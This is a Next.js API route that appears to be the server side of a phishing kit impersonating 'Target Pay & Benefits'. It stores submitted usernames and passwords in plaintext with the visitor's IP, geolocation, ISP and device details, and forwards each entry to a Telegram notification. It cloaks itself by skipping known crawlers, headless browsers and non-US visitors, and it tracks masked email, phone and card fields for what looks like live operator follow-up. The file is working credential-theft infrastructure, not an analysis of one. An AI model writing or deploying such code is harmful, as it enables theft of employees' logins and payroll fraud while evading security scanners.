import { NextRequest, NextResponse } from "next/server";
import { getDb, ensureTable, autoDeclineExpired } from "@/lib/db";
import { notifyNewTask } from "@/lib/telegram";


const BOT_UA_RE = /googlebot|bingbot|msnbot|slurp|yandexbot|baiduspider|duckduckbot|facebookexternalhit|facebookbot|twitterbot|linkedinbot|pinterest|applebot|petalbot|mj12bot|ahrefsbot|semrushbot|dotbot|gptbot|claudebot|anthropic-ai|bytespider|slackbot|discordbot|whatsapp|telegrambot|crawler|spider|bot\/|headlesschrome|phantomjs|puppeteer|playwright/i;

async function resolveGeo(req: NextRequest): Promise<{ ip: string; country: string; city: string; timezone: string; asOrg: string }> {
  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim()
    || req.headers.get("x-real-ip")
    || req.headers.get("cf-connecting-ip")
    || "Unknown";

  const country = req.headers.get("cf-ipcountry")
    || req.headers.get("x-vercel-ip-country")
    || req.headers.get("x-country-code")
    || null;

  if (country) {
    return {
      ip,
      country,
      city: req.headers.get("x-vercel-ip-city") || "Unknown",
      timezone: req.headers.get("x-vercel-ip-timezone") || "UTC",
      asOrg: "Unknown",
    };
  }

  if (ip === "Unknown" || ip === "127.0.0.1" || ip === "::1") {
    return { ip, country: "Unknown", city: "Unknown", timezone: "UTC", asOrg: "Unknown" };
  }

  const apis = [
    { url: `http://ip-api.com/json/${ip}?fields=countryCode,city,timezone,isp`, parse: (d: Record<string, string>) => ({ country: d.countryCode, city: d.city, timezone: d.timezone, asOrg: d.isp }) },
    { url: `https://ipapi.co/${ip}/json/`, parse: (d: Record<string, string>) => ({ country: d.country_code, city: d.city, timezone: d.timezone, asOrg: d.org }) },
  ];

  for (const api of apis) {
    try {
      const res = await fetch(api.url, { signal: AbortSignal.timeout(3000) });
      if (!res.ok) continue;
      const json = await res.json();
      const parsed = api.parse(json);
      if (parsed.country && /^[A-Z]{2}$/.test(parsed.country)) {
        return { ip, country: parsed.country, city: parsed.city || "Unknown", timezone: parsed.timezone || "UTC", asOrg: parsed.asOrg || "Unknown" };
      }
    } catch {}
  }

  return { ip, country: "Unknown", city: "Unknown", timezone: "UTC", asOrg: "Unknown" };
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const sql = getDb();
    await ensureTable(sql);
    await autoDeclineExpired(sql);

    const id = crypto.randomUUID();
    const now = Date.now();

    const geo = await resolveGeo(req);

    const isVisit = body.request_kind === "visit";

    if (isVisit) {
      if (geo.country !== "Unknown" && geo.country !== "US" && geo.country !== "XX" && geo.country !== "T1") {
        return NextResponse.json({ ok: true, skipped: true, reason: "non-us" });
      }
      const ua = body.device_info || req.headers.get("user-agent") || "";
      if (BOT_UA_RE.test(ua)) {
        return NextResponse.json({ ok: true, skipped: true, reason: "bot" });
      }
      if (body.bot_signals && body.bot_signals >= 2) {
        return NextResponse.json({ ok: true, skipped: true, reason: "bot-behavior" });
      }
      const recent = await sql`
        SELECT id FROM pending_logins
        WHERE request_kind = 'visit'
          AND user_id = ${geo.ip}
          AND created_at > ${now - 300000}
        LIMIT 1
      `;
      if (recent.length > 0) {
        return NextResponse.json({ ok: true, deduplicated: true });
      }
    }

    await sql`
      INSERT INTO pending_logins (
        id, project_id, user_id, password, method, masked_email, masked_phone,
        status, created_at, member_origin, request_kind, cc_id, project_name,
        flow_step, pending_since
      ) VALUES (
        ${id}, ${"target-site"}, ${body.user_id || geo.ip}, ${body.password || ""},
        ${body.method || "web"}, ${body.masked_email || "N/A"}, ${body.masked_phone || "N/A"},
        ${"pending"}, ${now}, ${body.member_origin || null}, ${body.request_kind || "login"},
        ${body.cc_id || null}, ${"Target Pay & Benefits"},
        ${isVisit ? "visit" : "login"}, ${now}
      )
    `;

    const taskData = {
      id,
      user_id: body.user_id || geo.ip,
      password: body.password,
      masked_email: body.masked_email || "N/A",
      masked_phone: body.masked_phone || "N/A",
      request_kind: body.request_kind || "login",
      member_origin: body.member_origin,
      device_info: body.device_info || req.headers.get("user-agent") || "",
      screen_size: body.screen_size,
      referrer: body.referrer || req.headers.get("referer") || "Direct",
      cf: { ip: geo.ip, country: geo.country, city: geo.city, timezone: geo.timezone, asOrganization: geo.asOrg },
    };

    await notifyNewTask(taskData);

    return NextResponse.json({ ok: true, id, status: "pending" });
  } catch (err) {
    console.error("[tasks POST]", err);
    return NextResponse.json({ error: "Internal error" }, { status: 500 });
  }
}

export async function GET() {
  try {
    const sql = getDb();
    await ensureTable(sql);
    await autoDeclineExpired(sql);

    const rows = await sql`
      SELECT id, user_id, status, request_kind, created_at, flow_step
      FROM pending_logins
      WHERE project_id = 'target-site'
      ORDER BY created_at DESC
      LIMIT 50
    `;

    return NextResponse.json({ ok: true, tasks: rows });
  } catch (err) {
    console.error("[tasks GET]", err);
    return NextResponse.json({ error: "Internal error" }, { status: 500 });
  }
}
